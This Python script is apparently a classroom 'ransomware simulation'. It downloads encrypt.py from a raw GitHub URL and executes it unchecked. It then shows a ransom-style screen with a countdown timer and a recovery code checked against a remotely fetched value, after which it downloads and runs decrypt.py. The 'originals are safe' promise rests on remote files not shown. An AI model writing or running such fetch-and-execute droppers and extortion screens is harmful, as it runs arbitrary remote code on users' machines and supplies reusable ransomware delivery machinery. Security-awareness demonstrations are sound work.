from pathlib import Path
import subprocess
import sys
import tkinter as tk
from datetime import datetime, timedelta
from urllib.request import urlopen

BASE = Path.home() / 'Desktop' / 'RansomDemo'
URL = 'https://raw.githubusercontent.com/what0302/what0302.github.io/master/_posts/'
BASE.mkdir(parents=True, exist_ok=True)


def get_file(name):
    data = urlopen(URL + name, timeout=12).read()
    file = BASE / name
    file.write_bytes(data)
    return file


def run_file(name):
    file = get_file(name)
    result = subprocess.run([sys.executable, str(file)], capture_output=True, text=True)
    return result.returncode, result.stdout + result.stderr


# This is a copy-only lab. Original files are kept.
code, message = run_file('encrypt.py')
print(message)

root = tk.Tk()
root.title('UNT Security Lab')
root.configure(bg='#8b0000')
root.geometry('980x660')
root.bind('<Escape>', lambda e: root.destroy())

body = tk.Frame(root, bg='#8b0000')
body.pack(expand=True)

try:
    from PIL import Image, ImageTk
    imgfile = get_file('unt_mascot.png')
    image = Image.open(imgfile).convert('RGBA')
    image.thumbnail((260, 400))
    photo = ImageTk.PhotoImage(image)
    mascot = tk.Label(body, image=photo, bg='#8b0000')
    mascot.image = photo
    mascot.grid(row=0, column=0, rowspan=8, padx=35)
except Exception:
    pass

right = tk.Frame(body, bg='#8b0000')
right.grid(row=0, column=1, padx=20)


def label(text, size, color='white'):
    item = tk.Label(right, text=text, font=('Arial', size, 'bold'), fg=color, bg='#8b0000')
    item.pack(pady=8)
    return item


label('RANSOMWARE SIMULATION', 30)
label('ENCRYPTED COPIES CREATED', 17, 'yellow')
label('THIS IS A TEST. ORIGINAL FILES ARE SAFE.', 12)
clock = label('00:30:00', 36, 'yellow')
end = datetime.now() + timedelta(minutes=30)


def tick():
    seconds = max(0, int((end - datetime.now()).total_seconds()))
    clock.config(text=f'{seconds // 3600:02}:{seconds // 60 % 60:02}:{seconds % 60:02}')
    if seconds:
        root.after(1000, tick)


tick()


def open_files():
    subprocess.Popen(['xdg-open', str(BASE / 'encrypted_output')])


tk.Button(right, text='VIEW ENCRYPTED COPIES', command=open_files).pack(pady=8)
label('RECOVERY CODE', 13)
entry = tk.Entry(right, width=18, show='*', justify='center', font=('Arial', 19))
entry.pack(pady=5)
status = label('', 11, 'yellow')


def recover():
    try:
        remote = urlopen(URL + 'recovery_code.txt', timeout=10).read().decode().strip()
        if entry.get().strip() != remote:
            status.config(text='INVALID CODE')
            return
        code, output = run_file('decrypt.py')
        print(output)
        if code == 0:
            status.config(text='RECOVERED COPIES VERIFIED')
            subprocess.Popen(['xdg-open', str(BASE / 'recovered_output')])
        else:
            status.config(text='RECOVERY ERROR - CHECK TERMINAL')
    except Exception as error:
        status.config(text=str(error)[:70])


tk.Button(right, text='RECOVER COPIES', command=recover).pack(pady=12)
entry.bind('<Return>', lambda e: recover())
label('SIMULATION ONLY • ESC = Exit', 11)
if code != 0:
    status.config(text='ENCRYPTION COPY FAILED - CHECK TERMINAL')
root.mainloop()
